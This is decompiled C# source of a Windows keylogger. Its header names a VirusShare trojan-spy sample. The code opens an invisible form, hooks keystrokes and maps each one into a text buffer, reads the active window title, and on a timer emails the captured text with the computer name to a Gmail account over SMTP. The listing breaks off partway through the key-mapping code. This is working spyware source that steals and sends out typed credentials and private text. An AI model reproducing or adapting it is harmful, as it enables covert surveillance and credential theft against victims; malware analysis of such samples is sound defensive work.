// Decompiled with JetBrains decompiler
// Type: .
// Assembly: dfghdfghtyetryetyetyety, Version=2.3.4.0, Culture=neutral, PublicKeyToken=null
// MVID: 915EBE8E-E020-4182-8C70-BC975537D555
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00000-msil\Trojan-Spy.MSIL.KeyLogger.cfj-677ef471c45c3e8820d5a40a4929bde24bd6660e8659c852e91d3edbc7fa5d9a.exe

using \u0002;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace \u0003
{
  [DesignerGenerated]
  internal class \u0002 : Form
  {
    private IContainer \u0001;
    [AccessedThroughProperty("lblnumb")]
    private Label \u0001;
    [AccessedThroughProperty("TextBox14")]
    private TextBox \u0001;
    [AccessedThroughProperty("TextBox10")]
    private TextBox \u0002;
    [AccessedThroughProperty("txtWin")]
    private TextBox \u0003;
    [AccessedThroughProperty("TextBox7")]
    private TextBox \u0004;
    [AccessedThroughProperty("TextBox6")]
    private TextBox \u0005;
    [AccessedThroughProperty("TextBox5")]
    private TextBox \u0006;
    [AccessedThroughProperty("TextBox4")]
    private TextBox \u0007;
    [AccessedThroughProperty("TextBox3")]
    private TextBox \u0008;
    [AccessedThroughProperty("TextBox2")]
    private TextBox \u000E;
    [AccessedThroughProperty("TextBox1")]
    private TextBox \u000F;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer \u0001;
    [AccessedThroughProperty("Timer2")]
    private System.Windows.Forms.Timer \u0002;
    [AccessedThroughProperty("Timer3")]
    private System.Windows.Forms.Timer \u0003;
    [AccessedThroughProperty("Timer4")]
    private System.Windows.Forms.Timer \u0004;
    [AccessedThroughProperty("Timer5")]
    private System.Windows.Forms.Timer \u0005;
    private string[] \u0001;
    private string \u0001;
    private string \u0002;
    private string \u0003;
    private string \u0004;
    private string \u0005;
    private string \u0006;
    private string \u0007;
    private string \u0008;
    private string \u000E;
    private string \u000F;
    private string \u0010;
    private string \u0011;
    private string \u0012;
    private string \u0013;
    private string \u0014;
    private string \u0015;
    private string \u0016;
    private string \u0017;
    private string \u0018;
    private string \u0019;
    private string \u001A;
    private string \u001B;
    private string \u001C;
    private string \u001D;
    private string \u001E;
    private string \u001F;
    private string \u007F;
    private string \u0080;
    private string \u0081;
    private string \u0082;
    private string \u0083;
    private const string \u0084 = "@JTR";
    private string \u0086;
    private string \u0087;
    private WebClient \u0001;
    private string \u0088;
    [AccessedThroughProperty("HKB")]
    private \u0003.\u0002.\u0001 \u0001;
    private string \u0089;

    public \u0002()
    {
      this.Load += new EventHandler(this.\u0004);
      this.\u0086 = \u0001.Computer.Name + "--" + Conversions.ToString(DateAndTime.TimeOfDay);
      this.\u0001 = new WebClient();
      this.HKB = new \u0003.\u0002.\u0001();
      this.\u0089 = (string) null;
      this.\u0002();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.\u0001 == null)
          return;
        this.\u0001.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void \u0002()
    {
      this.\u0001 = (IContainer) new System.ComponentModel.Container();
      this.lblnumb = new Label();
      this.TextBox14 = new TextBox();
      this.TextBox10 = new TextBox();
      this.txtWin = new TextBox();
      this.TextBox7 = new TextBox();
      this.TextBox6 = new TextBox();
      this.TextBox5 = new TextBox();
      this.TextBox4 = new TextBox();
      this.TextBox3 = new TextBox();
      this.TextBox2 = new TextBox();
      this.TextBox1 = new TextBox();
      this.Timer1 = new System.Windows.Forms.Timer(this.\u0001);
      this.Timer2 = new System.Windows.Forms.Timer(this.\u0001);
      this.Timer3 = new System.Windows.Forms.Timer(this.\u0001);
      this.Timer4 = new System.Windows.Forms.Timer(this.\u0001);
      this.Timer5 = new System.Windows.Forms.Timer(this.\u0001);
      this.SuspendLayout();
      this.lblnumb.AutoSize = true;
      Label lblnumb1 = this.lblnumb;
      Point point1 = new Point((int) sbyte.MaxValue, 57);
      Point point2 = point1;
      lblnumb1.Location = point2;
      this.lblnumb.Name = "lblnumb";
      Label lblnumb2 = this.lblnumb;
      Size size1 = new Size(39, 13);
      Size size2 = size1;
      lblnumb2.Size = size2;
      this.lblnumb.TabIndex = 21;
      this.lblnumb.Text = "Label1";
      TextBox textBox14_1 = this.TextBox14;
      point1 = new Point(114, 236);
      Point point3 = point1;
      textBox14_1.Location = point3;
      this.TextBox14.Name = "TextBox14";
      TextBox textBox14_2 = this.TextBox14;
      size1 = new Size(10, 20);
      Size size3 = size1;
      textBox14_2.Size = size3;
      this.TextBox14.TabIndex = 20;
      TextBox textBox10_1 = this.TextBox10;
      point1 = new Point(116, 210);
      Point point4 = point1;
      textBox10_1.Location = point4;
      this.TextBox10.Name = "TextBox10";
      TextBox textBox10_2 = this.TextBox10;
      size1 = new Size(8, 20);
      Size size4 = size1;
      textBox10_2.Size = size4;
      this.TextBox10.TabIndex = 19;
      TextBox txtWin1 = this.txtWin;
      point1 = new Point(116, 184);
      Point point5 = point1;
      txtWin1.Location = point5;
      this.txtWin.Name = "txtWin";
      TextBox txtWin2 = this.txtWin;
      size1 = new Size(10, 20);
      Size size5 = size1;
      txtWin2.Size = size5;
      this.txtWin.TabIndex = 18;
      TextBox textBox7_1 = this.TextBox7;
      point1 = new Point(116, 158);
      Point point6 = point1;
      textBox7_1.Location = point6;
      this.TextBox7.Name = "TextBox7";
      TextBox textBox7_2 = this.TextBox7;
      size1 = new Size(10, 20);
      Size size6 = size1;
      textBox7_2.Size = size6;
      this.TextBox7.TabIndex = 17;
      this.TextBox7.Text = "C:\\WINDOWS\\system32\\1025";
      TextBox textBox6_1 = this.TextBox6;
      point1 = new Point(116, 132);
      Point point7 = point1;
      textBox6_1.Location = point7;
      this.TextBox6.Name = "TextBox6";
      TextBox textBox6_2 = this.TextBox6;
      size1 = new Size(10, 20);
      Size size7 = size1;
      textBox6_2.Size = size7;
      this.TextBox6.TabIndex = 16;
      this.TextBox6.Text = "1";
      TextBox textBox5_1 = this.TextBox5;
      point1 = new Point(116, 106);
      Point point8 = point1;
      textBox5_1.Location = point8;
      this.TextBox5.Name = "TextBox5";
      TextBox textBox5_2 = this.TextBox5;
      size1 = new Size(10, 20);
      Size size8 = size1;
      textBox5_2.Size = size8;
      this.TextBox5.TabIndex = 15;
      this.TextBox5.Text = ".gif";
      TextBox textBox4_1 = this.TextBox4;
      point1 = new Point(116, 80);
      Point point9 = point1;
      textBox4_1.Location = point9;
      this.TextBox4.Name = "TextBox4";
      TextBox textBox4_2 = this.TextBox4;
      size1 = new Size(10, 20);
      Size size9 = size1;
      textBox4_2.Size = size9;
      this.TextBox4.TabIndex = 14;
      TextBox textBox3_1 = this.TextBox3;
      point1 = new Point(116, 54);
      Point point10 = point1;
      textBox3_1.Location = point10;
      this.TextBox3.Name = "TextBox3";
      TextBox textBox3_2 = this.TextBox3;
      size1 = new Size(10, 20);
      Size size10 = size1;
      textBox3_2.Size = size10;
      this.TextBox3.TabIndex = 13;
      TextBox textBox2_1 = this.TextBox2;
      point1 = new Point(116, 28);
      Point point11 = point1;
      textBox2_1.Location = point11;
      this.TextBox2.Name = "TextBox2";
      TextBox textBox2_2 = this.TextBox2;
      size1 = new Size(10, 20);
      Size size11 = size1;
      textBox2_2.Size = size11;
      this.TextBox2.TabIndex = 12;
      TextBox textBox1_1 = this.TextBox1;
      point1 = new Point(149, 6);
      Point point12 = point1;
      textBox1_1.Location = point12;
      this.TextBox1.Multiline = true;
      this.TextBox1.Name = "TextBox1";
      TextBox textBox1_2 = this.TextBox1;
      size1 = new Size(22, 10);
      Size size12 = size1;
      textBox1_2.Size = size12;
      this.TextBox1.TabIndex = 11;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(10, 10);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.lblnumb);
      this.Controls.Add((Control) this.TextBox14);
      this.Controls.Add((Control) this.TextBox10);
      this.Controls.Add((Control) this.txtWin);
      this.Controls.Add((Control) this.TextBox7);
      this.Controls.Add((Control) this.TextBox6);
      this.Controls.Add((Control) this.TextBox5);
      this.Controls.Add((Control) this.TextBox4);
      this.Controls.Add((Control) this.TextBox3);
      this.Controls.Add((Control) this.TextBox2);
      this.Controls.Add((Control) this.TextBox1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = "Form1";
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual Label lblnumb
    {
      [DebuggerNonUserCode] get => this.\u0001;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this.\u0001 = value;
    }

    internal virtual TextBox TextBox14
    {
      [DebuggerNonUserCode] get => this.\u0001;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this.\u0001 = value;
    }

    internal virtual TextBox TextBox10
    {
      [DebuggerNonUserCode] get => this.\u0002;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this.\u0002 = value;
    }

    internal virtual TextBox txtWin
    {
      [DebuggerNonUserCode] get => this.\u0003;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this.\u0003 = value;
    }

    internal virtual TextBox TextBox7
    {
      [DebuggerNonUserCode] get => this.\u0004;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this.\u0004 = value;
    }

    internal virtual TextBox TextBox6
    {
      [DebuggerNonUserCode] get => this.\u0005;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this.\u0005 = value;
    }

    internal virtual TextBox TextBox5
    {
      [DebuggerNonUserCode] get => this.\u0006;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this.\u0006 = value;
    }

    internal virtual TextBox TextBox4
    {
      [DebuggerNonUserCode] get => this.\u0007;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this.\u0007 = value;
    }

    internal virtual TextBox TextBox3
    {
      [DebuggerNonUserCode] get => this.\u0008;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this.\u0008 = value;
    }

    internal virtual TextBox TextBox2
    {
      [DebuggerNonUserCode] get => this.\u000E;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this.\u000E = value;
    }

    internal virtual TextBox TextBox1
    {
      [DebuggerNonUserCode] get => this.\u000F;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this.\u000F = value;
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      [DebuggerNonUserCode] get => this.\u0001;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\u0002);
        if (this.\u0001 != null)
          this.\u0001.Tick -= eventHandler;
        this.\u0001 = value;
        if (this.\u0001 == null)
          return;
        this.\u0001.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer2
    {
      [DebuggerNonUserCode] get => this.\u0002;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\u0003);
        if (this.\u0002 != null)
          this.\u0002.Tick -= eventHandler;
        this.\u0002 = value;
        if (this.\u0002 == null)
          return;
        this.\u0002.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer3
    {
      [DebuggerNonUserCode] get => this.\u0003;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\u0005);
        if (this.\u0003 != null)
          this.\u0003.Tick -= eventHandler;
        this.\u0003 = value;
        if (this.\u0003 == null)
          return;
        this.\u0003.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer4
    {
      [DebuggerNonUserCode] get => this.\u0004;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\u0006);
        if (this.\u0004 != null)
          this.\u0004.Tick -= eventHandler;
        this.\u0004 = value;
        if (this.\u0004 == null)
          return;
        this.\u0004.Tick += eventHandler;
      }
    }

    internal virtual System.Windows.Forms.Timer Timer5
    {
      [DebuggerNonUserCode] get => this.\u0005;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.\u0007);
        if (this.\u0005 != null)
          this.\u0005.Tick -= eventHandler;
        this.\u0005 = value;
        if (this.\u0005 == null)
          return;
        this.\u0005.Tick += eventHandler;
      }
    }

    private void \u0002(object sender, EventArgs e)
    {
      new SmtpClient("smtp.gmail.com")
      {
        Port = 587,
        EnableSsl = true,
        Credentials = ((ICredentialsByHost) new NetworkCredential(this.TextBox2.Text, this.TextBox3.Text))
      }.Send(new MailMessage()
      {
        Subject = \u0001.Computer.Name + ":",
        To = {
          this.TextBox2.Text
        },
        From = new MailAddress(this.TextBox2.Text),
        Body = this.TextBox1.Text + "Saat : " + Conversions.ToString(DateAndTime.TimeOfDay) + "  Tarih :" + DateAndTime.DateString
      });
      this.TextBox1.Clear();
    }

    private virtual \u0003.\u0002.\u0001 HKB
    {
      [DebuggerNonUserCode] get => this.\u0001;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        \u0003.\u0002.\u0001.\u0003 obj = new \u0003.\u0002.\u0001.\u0003(this.\u0002);
        if (this.\u0001 != null)
          \u0003.\u0002.\u0001.KD -= obj;
        this.\u0001 = value;
        if (this.\u0001 == null)
          return;
        \u0003.\u0002.\u0001.KD += obj;
      }
    }

    [DllImport("user32.dll", EntryPoint = "GetForegroundWindow", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0002();

    [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0002(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

    private string \u0002()
    {
      string lpString = new string(char.MinValue, 100);
      \u0003.\u0002.\u0002(\u0003.\u0002.\u0002(), ref lpString, 100);
      return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
    }

    public void \u0002(Keys Key)
    {
      if (!\u0001.Computer.Keyboard.ShiftKeyDown & !\u0001.Computer.Keyboard.CapsLock)
      {
        if (Key == Keys.A)
          this.TextBox1.Text += "a";
        else if (Key == Keys.B)
          this.TextBox1.Text += "b";
        else if (Key == Keys.C)
          this.TextBox1.Text += "c";
        else if (Key == Keys.D)
          this.TextBox1.Text += "d";
        else if (Key == Keys.E)
          this.TextBox1.Text += "e";
        else if (Key == Keys.F)
          this.TextBox1.Text += "f";
        else if (Key == Keys.G)
          this.TextBox1.Text += "g";
        else if (Key == Keys.H)
          this.TextBox1.Text += "h";
        else if (Key == Keys.I)
          this.TextBox1.Text += "i";
        else if (Key == Keys.J)
          this.TextBox1.Text += "j";
        else if (Key == Keys.K)
          this.TextBox1.Text += "k";
        else if (Key == Keys.L)
          this.TextBox1.Text += "l";
        else if (Key == Keys.M)
          this.TextBox1.Text += "m";
        else if (Key == Keys.N)
          this.TextBox1.Text += "n";
        else if (Key == Keys.O)
          this.TextBox1.Text += "o";
        else if (Key == Keys.P)
          this.TextBox1.Text += "p";
        else if (Key == Keys.Q)
          this.TextBox1.Text += "q";
        else if (Key == Keys.R)
          this.TextBox1.Text += "r";
        else if (Key == Keys.S)
          this.TextBox1.Text += "s";
        else if (Key == Keys.T)
          this.TextBox1.Text += "t";
        else if (Key == Keys.U)
          this.TextBox1.Text += "u";
        else if (Key == Keys.V)
          this.TextBox1.Text += "v";
        else if (Key == Keys.W)
          this.TextBox1.Text += "w";
        else if (Key == Keys.X)
          this.TextBox1.Text += "x";
        else if (Key == Keys.Y)
          this.TextBox1.Text += "y";
        else if (Key == Keys.Z)
          this.TextBox1.Text += "z";
        else if (Key == Keys.D0)
          this.TextBox1.Text += "0";
        else if (Key == Keys.D1)
          this.TextBox1.Text += "1";
        else if (Key == Keys.D2)
          this.TextBox1.Text += "2";
        else if (Key == Keys.D3)
          this.TextBox1.Text += "3";
        else if (Key == Keys.D4)
          this.TextBox1.Text += "4";
        else if (Key == Keys.D5)
          this.TextBox1.Text += "5";
        else if (Key == Keys.D6)
          this.TextBox1.Text += "6";
        else if (Key == Keys.D7)
          this.TextBox1.Text += "7";
        else if (Key == Keys.D8)
          this.TextBox1.Text += "8";
        else if (Key == Keys.D9)
          this.TextBox1.Text += "9";
        else if (Key == Keys.NumPad0)
          this.TextBox1.Text += "0";
        else if (Key == Keys.NumPad1)
          this.TextBox1.Text += "1";
        else if (Key == Keys.NumPad2)
          this.TextBox1.Text += "2";
        else if (Key == Keys.NumPad3)
          this.TextBox1.Text += "3";
        else if (Key == Keys.NumPad4)
          this.TextBox1.Text += "4";
        else if (Key == Keys.NumPad5)
          this.TextBox1.Text += "5";
        else if (Key == Keys.NumPad6)
          this.TextBox1.Text += "6";
        else if (Key == Keys.NumPad7)
          this.TextBox1.Text += "7";
        else if (Key == Keys.NumPad8)
          this.TextBox1.Text += "8";
        else if (Key == Keys.NumPad9)
          this.TextBox1.Text += "9";
        else if (Key == Keys.Oemcomma)
          this.TextBox1.Text += ",";
        else if (Key == Keys.OemMinus)
          this.TextBox1.Text += "-";
        else if (Key == Keys.OemQuotes)
          this.TextBox1.Text += "'";
        else if (Key == Keys.OemOpenBrackets)
          this.TextBox1.Text += "[";
        else if (Key == Keys.Back)
          this.TextBox1.Text += "[BACK]";
        else if (Key == Keys.OemCloseBrackets)
          this.TextBox1.Text += "]";
        else if (Key == Keys.OemQuestion)
          this.TextBox1.Text += "/";
        else if (Key == Keys.OemPipe)
          this.TextBox1.Text += "\\";
        else if (Key == Keys.OemSemicolon)
          this.TextBox1.Text += ";";
        else if (Key == Keys.OemPeriod)
          this.TextBox1.Text += ".";
        else if (Key == Keys.Oemtilde)
          this.TextBox1.Text += "`";
        else if (Key == Keys.Space)
          this.TextBox1.Text += " ";
        else if (Key == Keys.Return)
          this.TextBox1.Text += "\r\n";
        else if (Key == Keys.F1)
          this.TextBox1.Text += "[F1]";
        else if (Key == Keys.F2)
          this.TextBox1.Text += "[F2]";
        else if (Key == Keys.F3)
          this.TextBox1.Text += "[F3]";
        else if (Key == Keys.F4)
          this.TextBox1.Text += "[F4]";
        else if (Key == Keys.F5)
          this.TextBox1.Text += "[F5]";
        else if (Key == Keys.F6)
          this.TextBox1.Text += "[F6]";
        else if (Key == Keys.F7)
          this.TextBox1.Text += "[F7]";
        else if (Key == Keys.F8)
          this.TextBox1.Text += "[F8]";
        else if (Key == Keys.F9)
          this.TextBox1.Text += "[F9]";
        else if (Key == Keys.F10)
          this.TextBox1.Text += "[F10]";
        else if (Key == Keys.F11)
          this.TextBox1.Text += "[F11]";
        else if (Key == Keys.F12)
          this.TextBox1.Text += "[F12]";
        else if (Key == Keys.Delete)
          this.TextBox1.Text = this.TextBox1.Text.Remove(checked (this.TextBox1.Text.Length - 1), 1);
        else if (Key == Keys.Back)
          this.TextBox1.Text = this.TextBox1.Text.Remove(checked (this.TextBox1.Text.Length - 1), 1);
        else if (Key == Keys.Down)
          this.TextBox1.Text += "?";
        else if (Key == Keys.Up)
          this.TextBox1.Text += "?";
        else if (Key == Keys.Left)
          this.TextBox1.Text += "?";
        else if (Key == Keys.Right)
          this.TextBox1.Text += "?";
        else if (Key == Keys.Tab)
          this.TextBox1.Text += "[TAB]";
        else if (Key == Keys.End)
          this.TextBox1.Text += "[END]";
        else if (Key == Keys.Escape)
          this.TextBox1.Text += "[ESC]";
        else if (Key == Keys.Divide)
          this.TextBox1.Text += "/";
        else if (Key == Keys.Decimal)
          this.TextBox1.Text += ".";
        else if (Key == Keys.Subtract)
          this.TextBox1.Text += "-";
        else if (Key == Keys.Add)
        {
          this.TextBox1.Text += "+";
        }
        else
        {
          if (Key != Keys.Multiply)
            return;
          this.TextBox1.Text += "*";
        }
      }
      else if (!\u0001.Computer.Keyboard.ShiftKeyDown & \u0001.Computer.Keyboard.CapsLock)
      {
        switch (Key)
        {
          case Keys.Back:
            this.TextBox1.Text = this.TextBox1.Text.Remove(checked (this.TextBox1.Text.Length - 1), 1);
            break;
          case Keys.Tab:
            this.TextBox1.Text += "[TAB]";
            break;
          case Keys.Return:
            this.TextBox1.Text += "\r\n";
            break;
          case Keys.Escape:
            this.TextBox1.Text += "[ESC]";
            break;
          case Keys.Space:
            this.TextBox1.Text += " ";
            break;
          case Keys.End:
            this.TextBox1.Text += "[END]";
            break;
          case Keys.Left:
            this.TextBox1.Text += "?";
            break;
          case Keys.Up:
            this.TextBox1.Text += "?";
            break;
          case Keys.Right:
            this.TextBox1.Text += "?";
            break;
          case Keys.Down:
            this.TextBox1.Text += "?";
            break;
          case Keys.Delete:
            this.TextBox1.Text = this.TextBox1.Text.Remove(checked (this.TextBox1.Text.Length - 1), 1);
            break;
          case Keys.D0:
            this.TextBox1.Text += "0";
            break;
          case Keys.D1:
            this.TextBox1.Text += "1";
            break;
          case Keys.D2:
            this.TextBox1.Text += "2";
            break;
          case Keys.D3:
            this.TextBox1.Text += "3";
            break;
          case Keys.D4:
            this.TextBox1.Text += "4";
            break;
          case Keys.D5:
            this.TextBox1.Text += "5";
            break;
          case Keys.D6:
            this.TextBox1.Text += "6";
            break;
          case Keys.D7:
            this.TextBox1.Text += "7";
            break;
          case Keys.D8:
            this.TextBox1.Text += "8";
            break;
          case Keys.D9:
            this.TextBox1.Text += "9";
            break;
          case Keys.A:
            this.TextBox1.Text += "A";
            break;
          case Keys.B:
            this.TextBox1.Text += "B";
            break;
          case Keys.C:
            this.TextBox1.Text += "C";
            break;
          case Keys.D:
            this.TextBox1.Text += "D";
            break;
          case Keys.E:
            this.TextBox1.Text += "E";
            break;
          case Keys.F:
            this.TextBox1.Text += "F";
            break;
          case Keys.G:
            this.TextBox1.Text += "G";
            break;
          case Keys.H:
            this.TextBox1.Text += "H";
            break;
          case Keys.I:
            this.TextBox1.Text += "I";
            break;
          case Keys.J:
            this.TextBox1.Text += "J";
            break;
          case Keys.K:
            this.TextBox1.Text += "K";
            break;
          case Keys.L:
            this.TextBox1.Text += "L";
            break;
          case Keys.M:
            this.TextBox1.Text += "M";
            break;
          case Keys.N:
            this.TextBox1.Text += "N";
            break;
          case Keys.O:
            this.TextBox1.Text += "O";
            break;
          case Keys.P:
            this.TextBox1.Text += "P";
            break;
          case Keys.Q:
            this.TextBox1.Text += "Q";
            break;
          case Keys.R:
            this.TextBox1.Text += "R";
            break;
          case Keys.S:
            this.TextBox1.Text += "S";
            break;
          case Keys.T:
            this.TextBox1.Text += "T";
            break;
          case Keys.U:
            this.TextBox1.Text += "U";
            break;
          case Keys.V:
            this.TextBox1.Text += "V";
            break;
          case Keys.W:
            this.TextBox1.Text += "W";
            break;
          case Keys.X:
            this.TextBox1.Text += "X";
            break;
          case Keys.Y:
            this.TextBox1.Text += "Y";
            break;
          case Keys.Z:
            this.TextBox1.Text += "Z";
            break;
          case Keys.NumPad0:
            this.TextBox1.Text += "0";
            break;
          case Keys.NumPad1:
            this.TextBox1.Text += "1";
            break;
          case Keys.NumPad2:
            this.TextBox1.Text += "2";
            break;
          case Keys.NumPad3:
            this.TextBox1.Text += "3";
            break;
          case Keys.NumPad4:
            this.TextBox1.Text += "4";
            break;
          case Keys.NumPad5:
            this.TextBox1.Text += "5";
            break;
          case Keys.NumPad6:
            this.TextBox1.Text += "6";
            break;
          case Keys.NumPad7:
            this.TextBox1.Text += "7";
            break;
          case Keys.NumPad8:
            this.TextBox1.Text += "8";
            break;
          case Keys.NumPad9:
            this.TextBox1.Text += "9";
            break;
          case Keys.Multiply:
            this.TextBox1.Text += "*";
            break;
          case Keys.Add:
            this.TextBox1.Text += "+";
            break;
          case Keys.Subtract:
            this.TextBox1.Text += "-";
            break;
          case Keys.Decimal:
            this.TextBox1.Text += ".";
            break;
          case Keys.Divide:
            this.TextBox1.Text += "/";
            break;
          case Keys.F1:
            this.TextBox1.Text += "[F1]";
            break;
          case Keys.F2:
            this.TextBox1.Text += "[F2]";
            break;
          case Keys.F3:
            this.TextBox1.Text += "[F3]";
            break;
          case Keys.F4:
            this.TextBox1.Text += "[F4]";
            break;
          case Keys.F5:
            this.TextBox1.Text += "[F5]";
            break;
          case Keys.F6:
            this.TextBox1.Text += "[F6]";
            break;
          case Keys.F7:
            this.TextBox1.Text += "[F7]";
            break;
          case Keys.F8:
            this.TextBox1.Text += "[F8]";
            break;
          case Keys.F9:
            this.TextBox1.Text += "[F9]";
            break;
          case Keys.F10:
            this.TextBox1.Text += "[F10]";
            break;
          case Keys.F11:
            this.TextBox1.Text += "[F11]";
            break;
          case Keys.F12:
            this.TextBox1.Text += "[F12]";
            break;
          case Keys.OemSemicolon:
            this.TextBox1.Text += ";";
            break;
          case Keys.Oemcomma:
            this.TextBox1.Text += ",";
            break;
          case Keys.OemMinus:
            this.TextBox1.Text += "-";
            break;
          case Keys.OemPeriod:
            this.TextBox1.Text += ".";
            break;
          case Keys.OemQuestion:
            this.TextBox1.Text += "/";
            break;
          case Keys.Oemtilde:
            this.TextBox1.Text += "`";
            break;
          case Keys.OemOpenBrackets:
            this.TextBox1.Text += "[";
            break;
          case Keys.OemPipe:
            this.TextBox1.Text += "\\";
            break;
          case Keys.OemCloseBrackets:
            this.TextBox1.Text += "]";
            break;
          case Keys.OemQuotes:
            this.TextBox1.Text += "'";
            break;
        }
      }
      else if (\u0001.Computer.Keyboard.ShiftKeyDown & \u0001.Computer.Keyboard.CapsLock)
      {
        switch (Key)
        {
          case Keys.Back:
            this.TextBox1.Text = this.TextBox1.Text.Remove(checked (this.TextBox1.Text.Length - 1), 1);
            break;
          case Keys.Tab:
            this.TextBox1.Text += "[TAB]";
            break;
          case Keys.Return:
            this.TextBox1.Text += "\r\n";
            break;
          case Keys.Escape:
            this.TextBox1.Text += "[ESC]";
            break;
          case Keys.Space:
            this.TextBox1.Text += " ";
            break;
          case Keys.End:
            this.TextBox1.Text += "[END]";
            break;
          case Keys.Left:
            this.TextBox1.Text += "?";
            break;
          case Keys.Up:
            this.TextBox1.Text += "?";
            break;
          case Keys.Right:
            this.TextBox1.Text += "?";
            break;
          case Keys.Down:
            this.TextBox1.Text += "?";
            break;
          case Keys.Delete:
            this.TextBox1.Text = this.TextBox1.Text.Remove(checked (this.TextBox1.Text.Length - 1), 1);
            break;
          case Keys.D0:
            this.TextBox1.Text += ")";
            break;
          case Keys.D1:
            this.TextBox1.Text += "!";
            break;
          case Keys.D2:
            this.TextBox1.Text += "@";
            break;
          case Keys.D3:
            this.TextBox1.Text += "#";
            break;
          case Keys.D4:
            this.TextBox1.Text += "$";
            break;
          case Keys.D5:
            this.TextBox1.Text += "%";
            break;
          case Keys.D6:
            this.TextBox1.Text += "^";
            break;
          case Keys.D7:
            this.TextBox1.Text += "&";
            break;
          case Keys.D8:
            this.TextBox1.Text += "*";
            break;
          case Keys.D9:
            this.TextBox1.Text += "(";
            break;
          case Keys.A:
            this.TextBox1.Text += "A";
            break;
          case Keys.B:
            this.TextBox1.Text += "B";
            break;
          case Keys.C:
            this.TextBox1.Text += "C";
            break;
          case Keys.D:
            this.TextBox1.Text += "D";
            break;
          case Keys.E:
            this.TextBox1.Text += "E";
            break;
          case Keys.F:
            this.TextBox1.Text += "F";
            break;
          case Keys.G:
            this.TextBox1.Text += "G";
            break;
          case Keys.H:
            this.TextBox1.Text += "H";
            break;
          case Keys.I:
            this.TextBox1.Text += "I";
            break;
          case Keys.J:
            this.TextBox1.Text += "J";
            break;
          case Keys.K:
            this.TextBox1.Text += "K";
            break;
          case Keys.L:
            this.TextBox1.Text += "L";
            break;
          case Keys.M:
            this.TextBox1.Text += "M";
            break;
          case Keys.N:
            this.TextBox1.Text += "N";
            break;
          case Keys.O:
            this.TextBox1.Text += "O";
            break;
          case Keys.P:
            this.TextBox1.Text += "P";
            break;
          case Keys.Q:
            this.TextBox1.Text += "Q";
            break;
          case Keys.R:
            this.TextBox1.Text += "R";
            break;
          case Keys.S:
            this.TextBox1.Text += "S";
            break;
          case Keys.T:
            this.TextBox1.Text += "T";
            break;
          case Keys.U:
            this.TextBox1.Text += "U";
            break;
          case Keys.V:
            this.TextBox1.Text += "V";
            break;
          case Keys.W:
            this.TextBox1.Text += "W";
            break;
          case Keys.X:
            this.TextBox1.Text += "X";
            break;
          case Keys.Y:
            this.TextBox1.Text += "Y";
            break;
          case Keys.Z:
            this.TextBox1.Text += "Z";
            break;
          case Keys.Multiply:
            this.TextBox1.Text += "*";
            break;
          case Keys.Add:
            this.TextBox1.Text += "+";
            break;
          case Keys.Subtract:
            this.TextBox1.Text += "-";
            break;
          case Keys.Decimal:
            this.TextBox1.Text += ".";
            break;
          case Keys.Divide:
            this.TextBox1.Text += "/";
            break;
          case Keys.F1:
            this.TextBox1.Text += "[F1]";
            break;
          case Keys.F2:
            this.TextBox1.Text += "[F2]";
            break;
          case Keys.F3:
            this.TextBox1.Text += "[F3]";
            break;
          case Keys.F4:
            this.TextBox1.Text += "[F4]";
            break;
          case Keys.F5:
            this.TextBox1.Text += "[F5]";
            break;
          case Keys.F6:
            this.TextBox1.Text += "[F6]";
            break;
          case Keys.F7:
            this.TextBox1.Text += "[F7]";
            break;
